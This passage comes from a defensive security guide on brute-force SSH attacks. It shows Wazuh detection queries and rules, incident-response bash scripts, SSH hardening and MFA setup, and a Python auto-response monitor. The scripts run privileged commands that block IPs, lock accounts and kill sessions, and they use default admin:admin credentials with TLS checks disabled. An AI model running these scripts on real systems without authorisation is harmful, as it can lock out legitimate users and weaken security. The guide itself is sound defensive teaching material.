            "size": 10
          }
        }
      }
    }
  }
}

// Query 2: Detect attack patterns
{
  "query": {
    "bool": {
      "must": [
        {
          "range": {
            "rule.level": {
              "gte": 8
            }
          }
        },
        {
          "terms": {
            "rule.id": ["5710", "5712", "5763"]
          }
        }
      ]
    }
  },
  "aggs": {
    "attack_timeline": {
      "date_histogram": {
        "field": "@timestamp",
        "interval": "1m"
      },
      "aggs": {
        "unique_sources": {
          "cardinality": {
            "field": "data.srcip"
          }
        },
        "total_attempts": {
          "sum": {
            "field": "rule.frequency"
          }
        }
      }
    }
  }
}

// Query 3: Successful logins after attacks
{
  "query": {
    "bool": {
      "must": [
        {
          "term": {
            "rule.groups": "authentication_success"
          }
        }
      ],
      "filter": [
        {
          "terms": {
            "data.srcip": ["<attacker_ips>"]
          }
        }
      ]
    }
  }
}
```

## Part 5: Incident Response and Recovery

### Incident Response Playbook

#### Phase 1: Detection and Analysis
```bash
#!/bin/bash
# Incident Response Script - Phase 1

INCIDENT_ID="BF-$(date +%Y%m%d-%H%M%S)"
IR_DIR="/var/incident_response/$INCIDENT_ID"
mkdir -p $IR_DIR

echo "=== Brute-Force Incident Response ==="
echo "Incident ID: $INCIDENT_ID"
echo "Time: $(date)"

# Collect attack indicators
echo "[*] Collecting attack indicators..."

# Get attacker IPs from Wazuh
curl -k -u admin:admin \
  "https://localhost:55000/security/events?q=rule.id:5712" \
  | jq '.data.affected_items[].data.srcip' \
  | sort -u > $IR_DIR/attacker_ips.txt

# Get targeted accounts
grep "Failed password" /var/log/auth.log \
  | awk '{print $9}' \
  | sort -u > $IR_DIR/targeted_accounts.txt

# Get successful logins during attack window
grep "Accepted password" /var/log/auth.log \
  | grep -f $IR_DIR/attacker_ips.txt \
  > $IR_DIR/successful_logins.txt

# Check for privilege escalation
grep "sudo\|su\|COMMAND" /var/log/auth.log \
  | tail -100 > $IR_DIR/privilege_checks.txt

# Collect system state
ps aux > $IR_DIR/processes.txt
netstat -tulpan > $IR_DIR/connections.txt
w > $IR_DIR/logged_users.txt
last -50 > $IR_DIR/login_history.txt

echo "[*] Initial analysis complete. Data saved to $IR_DIR"
```

#### Phase 2: Containment
```bash
#!/bin/bash
# Incident Response Script - Phase 2

# Immediate containment actions
echo "[*] Initiating containment measures..."

# Block all attacker IPs
while read ip; do
    iptables -I INPUT -s $ip -j DROP
    echo "Blocked: $ip"
done < $IR_DIR/attacker_ips.txt

# Disable compromised accounts
while read user; do
    if grep -q "^$user:" /etc/passwd; then
        usermod -L $user
        echo "Locked account: $user"
    fi
done < $IR_DIR/targeted_accounts.txt

# Kill suspicious sessions
who | grep -f $IR_DIR/attacker_ips.txt | awk '{print $2}' | while read tty; do
    pkill -9 -t $tty
    echo "Killed session: $tty"
done

# Reset passwords for affected accounts
echo "[*] Generating password reset list..."
cat $IR_DIR/targeted_accounts.txt | while read user; do
    echo "$user:$(openssl rand -base64 12)" >> $IR_DIR/password_resets.txt
done

echo "[*] Containment complete"
```

#### Phase 3: Eradication
```bash
#!/bin/bash
# Incident Response Script - Phase 3

echo "[*] Beginning eradication phase..."

# Remove attacker's SSH keys
find /home -name "authorized_keys" -exec grep -l "POTENTIAL_COMPROMISE" {} \; \
  > $IR_DIR/compromised_keys.txt

# Check for backdoors
find / -name "*.sh" -mtime -1 -exec ls -la {} \; > $IR_DIR/recent_scripts.txt
find /tmp /var/tmp /dev/shm -type f -exec file {} \; > $IR_DIR/tmp_files.txt

# Check for persistence mechanisms
crontab -l > $IR_DIR/root_crontab.txt
ls -la /etc/cron* > $IR_DIR/system_cron.txt
systemctl list-unit-files | grep enabled > $IR_DIR/services.txt

# Scan for rootkits
chkrootkit > $IR_DIR/chkrootkit_results.txt 2>&1
rkhunter --check --skip-keypress > $IR_DIR/rkhunter_results.txt 2>&1

# Remove suspicious files
# Manual review required before deletion
echo "[!] Review $IR_DIR for suspicious files before deletion"
```

#### Phase 4: Recovery
```bash
#!/bin/bash
# Incident Response Script - Phase 4

echo "[*] Starting recovery phase..."

# Harden SSH configuration
cat > /etc/ssh/sshd_config.d/99-hardening.conf << EOF
# Hardened configuration post-incident
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
MaxSessions 2
LoginGraceTime 30
AllowUsers admin@192.168.1.0/24
DenyUsers root
ClientAliveInterval 300
ClientAliveCountMax 2
EOF

# Implement fail2ban
apt install -y fail2ban
cat > /etc/fail2ban/jail.local << EOF
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
EOF

systemctl restart fail2ban

# Update Wazuh rules for enhanced detection
cat >> /var/ossec/etc/rules/local_rules.xml << EOF
<rule id="100200" level="15">
  <if_sid>5712</if_sid>
  <time>14400</time>
  <description>Brute force attack - Permanent block required</description>
  <group>brute_force,permanent_block,</group>
</rule>
EOF

# Generate incident report
echo "[*] Generating incident report..."
cat > $IR_DIR/incident_report.md << EOF
# Brute-Force Attack Incident Report
**Incident ID**: $INCIDENT_ID
**Date**: $(date)
**Severity**: High
**Status**: Contained

## Executive Summary
A brute-force attack was detected and successfully mitigated.

## Timeline
- Detection: $(grep -m1 "5712" /var/ossec/logs/alerts/alerts.json | jq .timestamp)
- Containment: $(date)
- Recovery: In progress

## Impact
- Targeted accounts: $(wc -l < $IR_DIR/targeted_accounts.txt)
- Successful logins: $(wc -l < $IR_DIR/successful_logins.txt)
- Affected systems: $(hostname)

## Actions Taken
1. Blocked attacker IPs
2. Disabled compromised accounts
3. Reset passwords
4. Hardened SSH configuration
5. Implemented fail2ban
6. Enhanced monitoring rules

## Recommendations
1. Implement MFA for all accounts
2. Regular security awareness training
3. Periodic password audits
4. Enhanced monitoring of authentication events
EOF

echo "[*] Recovery complete. Report saved to $IR_DIR/incident_report.md"
```

## Part 6: Prevention and Hardening

### Comprehensive SSH Hardening

```bash
#!/bin/bash
# Complete SSH Hardening Script

# Backup original configuration
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.$(date +%Y%m%d)

# Generate strong host keys
ssh-keygen -A -b 4096

# Configure sshd_config with maximum security
cat > /etc/ssh/sshd_config << 'EOF'
# SSH Server Hardened Configuration
# Generated: $(date)

# Protocol and Port
Port 22222  # Non-standard port
Protocol 2
AddressFamily inet  # IPv4 only, change to 'any' for IPv6

# Host Keys (only strong algorithms)
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key

# Cryptography Settings
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

# Authentication
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
KerberosAuthentication no
GSSAPIAuthentication no
UsePAM yes
AuthenticationMethods publickey
AuthorizedKeysFile .ssh/authorized_keys
StrictModes yes
IgnoreRhosts yes
HostbasedAuthentication no

# Login Settings
LoginGraceTime 30
MaxAuthTries 3
MaxSessions 2
MaxStartups 10:30:60

# User/Group Restrictions
AllowGroups ssh-users
DenyUsers root admin administrator guest test demo nobody

# Connection Settings
ClientAliveInterval 300
ClientAliveCountMax 2
TCPKeepAlive no
Compression delayed
UseDNS no

# Forwarding
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no
GatewayPorts no

# Logging
SyslogFacility AUTH
LogLevel VERBOSE

# Banner
Banner /etc/ssh/banner.txt

# SFTP
Subsystem sftp /usr/lib/openssh/sftp-server -f AUTHPRIV -l INFO

# Chroot for SFTP users (optional)
#Match Group sftp-users
#    ChrootDirectory /home/%u
#    ForceCommand internal-sftp
#    AllowTcpForwarding no
#    X11Forwarding no
EOF

# Create SSH banner
cat > /etc/ssh/banner.txt << 'EOF'
***************************************************************************
                            SECURITY WARNING
***************************************************************************
This is a private system. Unauthorized access is strictly prohibited.
All access attempts are logged and monitored. Unauthorized access will
be prosecuted to the fullest extent of the law.

By accessing this system, you consent to monitoring and recording.
***************************************************************************
EOF

# Create ssh-users group
groupadd -r ssh-users

# Add legitimate users to ssh-users group
# usermod -a -G ssh-users username

# Set proper permissions
chmod 644 /etc/ssh/sshd_config
chmod 644 /etc/ssh/banner.txt
chmod 600 /etc/ssh/ssh_host_*_key
chmod 644 /etc/ssh/ssh_host_*_key.pub

# Validate configuration
sshd -t && systemctl restart sshd

echo "SSH hardening complete. Remember to:"
echo "1. Add users to 'ssh-users' group: usermod -a -G ssh-users username"
echo "2. Configure firewall for port 22222"
echo "3. Update client configurations for new port"
```

### Implementing Multi-Factor Authentication

```bash
#!/bin/bash
# Setup Google Authenticator for SSH MFA

# Install Google Authenticator
apt update && apt install -y libpam-google-authenticator

# Configure PAM for SSH
cat >> /etc/pam.d/sshd << 'EOF'
# Google Authenticator
auth required pam_google_authenticator.so nullok
EOF

# Update SSH configuration for MFA
sed -i 's/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
echo "AuthenticationMethods publickey,keyboard-interactive" >> /etc/ssh/sshd_config

# Per-user setup script
cat > /usr/local/bin/setup-mfa.sh << 'EOF'
#!/bin/bash
echo "Setting up MFA for user: $USER"
google-authenticator -t -d -f -r 3 -R 30 -w 17
echo "MFA setup complete. Scan the QR code with your authenticator app."
EOF

chmod +x /usr/local/bin/setup-mfa.sh

# Restart SSH
systemctl restart sshd

echo "MFA setup complete. Users must run 'setup-mfa.sh' to enable MFA"
```

### Advanced Monitoring and Alerting

```python
#!/usr/bin/env python3
# Advanced Brute-Force Monitoring Script
# Integrates with Wazuh API for real-time alerting

import requests
import json
import time
import smtplib
import subprocess
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from collections import defaultdict

class BruteForceMonitor:
    def __init__(self, config_file='monitor_config.json'):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        
        self.wazuh_api = self.config['wazuh_api']
        self.thresholds = self.config['thresholds']
        self.alert_destinations = self.config['alert_destinations']
        self.attack_tracker = defaultdict(lambda: {'count': 0, 'first_seen': None})
    
    def get_wazuh_token(self):
        """Authenticate with Wazuh API"""
        response = requests.post(
            f"{self.wazuh_api['url']}/security/user/authenticate",
            auth=(self.wazuh_api['user'], self.wazuh_api['password']),
            verify=False
        )
        return response.json()['data']['token']
    
    def query_brute_force_events(self, minutes=5):
        """Query recent brute-force events from Wazuh"""
        token = self.get_wazuh_token()
        headers = {'Authorization': f'Bearer {token}'}
        
        params = {
            'rule.id': '5710,5712,5763',
            'time_frame': f'{minutes}m',
            'limit': 1000
        }
        
        response = requests.get(
            f"{self.wazuh_api['url']}/security/events",
            headers=headers,
            params=params,
            verify=False
        )
        
        return response.json()['data']['affected_items']
    
    def analyze_attack_patterns(self, events):
        """Analyze events for attack patterns"""
        patterns = {
            'distributed': False,
            'credential_stuffing': False,
            'slow_brute_force': False,
            'targeted': False
        }
        
        source_ips = defaultdict(int)
        target_users = defaultdict(int)
        timestamps = []
        
        for event in events:
            source_ips[event.get('data', {}).get('srcip', 'unknown')] += 1
            target_users[event.get('data', {}).get('dstuser', 'unknown')] += 1
            timestamps.append(event.get('timestamp'))
        
        # Detect distributed attack
        if len(source_ips) > self.thresholds['distributed_sources']:
            patterns['distributed'] = True
        
        # Detect credential stuffing
        if len(target_users) > self.thresholds['credential_stuffing_users']:
            patterns['credential_stuffing'] = True
        
        # Detect slow brute-force
        if timestamps:
            time_spread = (datetime.fromisoformat(max(timestamps)) - 
                          datetime.fromisoformat(min(timestamps))).seconds
            if time_spread > 3600 and len(events) < 50:
                patterns['slow_brute_force'] = True
        
        # Detect targeted attack
        if len(target_users) == 1 and len(events) > self.thresholds['targeted_attempts']:
            patterns['targeted'] = True
        
        return patterns, source_ips, target_users
    
    def calculate_risk_score(self, patterns, source_ips, events_count):
        """Calculate risk score based on attack characteristics"""
        risk_score = 0
        
        # Base score from event count
        risk_score += min(events_count / 10, 30)
        
        # Pattern-based scoring
        if patterns['distributed']:
            risk_score += 20
        if patterns['credential_stuffing']:
            risk_score += 15
        if patterns['slow_brute_force']:
            risk_score += 10
        if patterns['targeted']:
            risk_score += 25
        
        # Source IP reputation (simplified)
        for ip in source_ips:
            if self.is_known_attacker(ip):
                risk_score += 10
        
        return min(risk_score, 100)  # Cap at 100
    
    def is_known_attacker(self, ip):
        """Check if IP is in threat intelligence database"""
        # Simplified check - in production, query threat intel feeds
        known_bad_ips = ['10.0.0.1', '192.168.1.1']  # Example
        return ip in known_bad_ips
    
    def generate_alert(self, risk_score, patterns, source_ips, target_users):
        """Generate detailed alert"""
        alert = {
            'timestamp': datetime.now().isoformat(),
            'risk_score': risk_score,
            'severity': self.get_severity(risk_score),
            'patterns': patterns,
            'source_ips': dict(source_ips),
            'target_users': dict(target_users),
            'recommendations': self.get_recommendations(patterns, risk_score)
        }
        
        return alert
    
    def get_severity(self, risk_score):
        """Determine severity based on risk score"""
        if risk_score >= 80:
            return 'CRITICAL'
        elif risk_score >= 60:
            return 'HIGH'
        elif risk_score >= 40:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def get_recommendations(self, patterns, risk_score):
        """Generate recommendations based on attack patterns"""
        recommendations = []
        
        if patterns['distributed']:
            recommendations.append("Implement rate limiting at network edge")
            recommendations.append("Consider DDoS protection service")
        
        if patterns['credential_stuffing']:
            recommendations.append("Force password reset for affected users")
            recommendations.append("Implement MFA immediately")
        
        if patterns['slow_brute_force']:
            recommendations.append("Lower authentication failure thresholds")
            recommendations.append("Implement account lockout policies")
        
        if patterns['targeted']:
            recommendations.append("Investigate targeted account for compromise")
            recommendations.append("Review account privileges")
        
        if risk_score >= 80:
            recommendations.append("IMMEDIATE ACTION: Block all source IPs")
            recommendations.append("Initiate incident response procedures")
        
        return recommendations
    
    def send_alert(self, alert):
        """Send alert via multiple channels"""
        # Email alert
        if 'email' in self.alert_destinations:
            self.send_email_alert(alert)
        
        # Slack alert
        if 'slack' in self.alert_destinations:
            self.send_slack_alert(alert)
        
        # Syslog alert
        if 'syslog' in self.alert_destinations:
            self.send_syslog_alert(alert)
        
        # Execute response script
        if alert['risk_score'] >= self.thresholds['auto_response_threshold']:
            self.execute_response(alert)
    
    def send_email_alert(self, alert):
        """Send email alert"""
        msg = MIMEMultipart()
        msg['From'] = self.config['email']['from']
        msg['To'] = ', '.join(self.config['email']['to'])
        msg['Subject'] = f"[{alert['severity']}] Brute-Force Attack Detected"
        
        body = f"""
        Brute-Force Attack Alert
        ========================
        Timestamp: {alert['timestamp']}
        Risk Score: {alert['risk_score']}/100
        Severity: {alert['severity']}
        
        Attack Patterns:
        {json.dumps(alert['patterns'], indent=2)}
        
        Source IPs (top 5):
        {json.dumps(dict(list(alert['source_ips'].items())[:5]), indent=2)}
        
        Targeted Users (top 5):
        {json.dumps(dict(list(alert['target_users'].items())[:5]), indent=2)}
        
        Recommendations:
        {chr(10).join(f"- {r}" for r in alert['recommendations'])}
        
        View full details in Wazuh Dashboard
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        with smtplib.SMTP(self.config['email']['smtp_server'], 
                          self.config['email']['smtp_port']) as server:
            server.starttls()
            server.login(self.config['email']['username'], 
                        self.config['email']['password'])
            server.send_message(msg)
    
    def execute_response(self, alert):
        """Execute automated response"""
        print(f"[!] Executing automated response for risk score: {alert['risk_score']}")
        
        # Block IPs with high attack count
        for ip, count in alert['source_ips'].items():
            if count > self.thresholds['block_threshold']:
                subprocess.run(['iptables', '-I', 'INPUT', '-s', ip, '-j', 'DROP'])
                print(f"[+] Blocked IP: {ip}")
        
        # Lock accounts under attack
        for user, count in alert['target_users'].items():
            if count > self.thresholds['lock_threshold']:
                subprocess.run(['usermod', '-L', user])
                print(f"[+] Locked account: {user}")
    
    def monitor(self):
        """Main monitoring loop"""
        print("[*] Starting Brute-Force Monitor...")
        
        while True:
            try:
                # Query recent events
                events = self.query_brute_force_events()
                
                if events:
                    # Analyze patterns
                    patterns, source_ips, target_users = self.analyze_attack_patterns(events)
                    
                    # Calculate risk
                    risk_score = self.calculate_risk_score(patterns, source_ips, len(events))
                    
                    # Generate and send alert if threshold exceeded
                    if risk_score >= self.thresholds['alert_threshold']:
                        alert = self.generate_alert(risk_score, patterns, 
                                                   source_ips, target_users)
                        self.send_alert(alert)
                        print(f"[!] Alert sent - Risk Score: {risk_score}")
                
                # Wait before next check
                time.sleep(self.config['check_interval'])
                
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(60)

# Configuration file (monitor_config.json)
config = {
    "wazuh_api": {
        "url": "https://localhost:55000",
        "user": "admin",
        "password": "admin"
    },
    "thresholds": {
        "alert_threshold": 40,
        "auto_response_threshold": 70,
        "block_threshold": 50,
        "lock_threshold": 30,
        "distributed_sources": 5,
        "credential_stuffing_users": 10,
        "targeted_attempts": 100
    },
    "alert_destinations": {
        "email": true,
        "slack": true,
        "syslog": true
    },
    "email": {
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587,
        "from": "security@company.com",
        "to": ["soc@company.com", "admin@company.com"],
        "username": "security@company.com",
        "password": "app_password"
    },
    "slack": {
        "webhook_url": "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
    },
    "check_interval": 60
}

# Save config and run monitor
if __name__ == "__main__":
    with open('monitor_config.json', 'w') as f:
        json.dump(config, f, indent=2)
    
    monitor = BruteForceMonitor()
    monitor.monitor()
```

## Part 7: Lessons Learned and Best Practices

### Key Takeaways from Real-World Incidents

#### 1. Detection Is Not Enough
- **Average detection time**: 5-30 seconds
- **Average response time**: 2-10 minutes
- **Gap exploitation**: Attackers can succeed in the window between detection and response
- **Solution**: Automated response is critical

#### 2. Attack Evolution
```
Traditional Brute-Force (2020):
- Single source IP
- Rapid attempts (100-1000/min)
- Common passwords
- Easy to detect and block

Modern Brute-Force (2025):
- Distributed sources (100+ IPs)
- Slow and steady (1-10/min per IP)
- Leaked credentials
- AI-generated passwords
- Harder to detect without correlation
```

#### 3. Success Factors for Defense
- **Visibility**: You can't protect what you can't see
- **Speed**: Automated response beats manual intervention
- **Intelligence**: Context and correlation reveal hidden attacks
- **Resilience**: Multiple defense layers prevent single points of failure

### Security Metrics and KPIs

```yaml
Brute-Force Defense Metrics:
  Detection Metrics:
    - Mean Time to Detect (MTTD): Target < 60 seconds
    - Detection Rate: Target > 95%
    - False Positive Rate: Target < 5%
    
  Response Metrics:
    - Mean Time to Respond (MTTR): Target < 5 minutes
    - Auto-Response Rate: Target > 80%
    - Containment Success Rate: Target > 90%
    
  Prevention Metrics:
    - Account Compromise Rate: Target < 0.1%
    - Repeat Attack Rate: Target < 10%
    - Password Strength Score: Target > 80/100
    
  Operational Metrics:
    - Alert Volume: Monitor for anomalies
    - Rule Effectiveness: Regular review
    - System Performance Impact: < 5% overhead
```

### Continuous Improvement Cycle

```
1. Monitor
   └─> Collect metrics and logs
   
2. Analyze
   └─> Identify patterns and gaps
   
3. Improve
   └─> Update rules and responses
   
4. Test
   └─> Validate changes in lab
   
5. Deploy
   └─> Roll out to production
   
6. Review
   └─> Assess effectiveness
   
└─> Return to Monitor
```

## Conclusion: Building Resilient Defense

Brute-force attacks, despite their simplicity, remain a significant threat because they exploit the weakest link in security: human-chosen passwords. The combination of tools like Hydra in the attacker's arsenal and comprehensive SIEM solutions like Wazuh in the defender's toolkit creates an ongoing arms race.

### The Future of Authentication Security

As we look toward the future, several trends will shape the brute-force landscape:

1. **Passwordless Authentication**: Biometrics, hardware tokens, and cryptographic keys
2. **AI-Powered Defense**: Machine learning models that adapt to attack patterns
3. **Zero Trust Architecture**: Assume breach and verify continuously
4. **Quantum-Resistant Cryptography**: Preparing for quantum computing threats

### Final Recommendations

1. **Implement Defense in Depth**: No single control is sufficient
2. **Automate Everything Possible**: Human response is too slow
3. **Test Your Defenses**: Regular penetration testing reveals gaps
4. **Train Your Team**: Technology alone isn't enough
5. **Share Intelligence**: Collaborate with the security community

### Remember: Security Is a Journey, Not a Destination

The battle against brute-force attacks is won not through a single decisive victory, but through consistent, persistent, and evolving defense strategies. Every failed attack makes your system stronger, every successful defense teaches you something new, and every incident drives improvement.

Stay vigilant, stay updated, and most importantly, stay ahead of the attackers.

---

*"In the world of cybersecurity, the best offense is a good defense, and the best defense is one that learns, adapts, and responds faster than any human attacker can operate."*

---

**About the Author**: Anubhav Gain is a DevSecOps Engineer and Technical Writer specializing in security monitoring, incident response, and threat detection. With extensive experience in SIEM deployment and security automation, he helps organizations build resilient defenses against modern cyber threats.

**Disclaimer**: This guide is for educational and defensive purposes only. Always ensure you have proper authorization before conducting security testing. Unauthorized access attempts are illegal and unethical.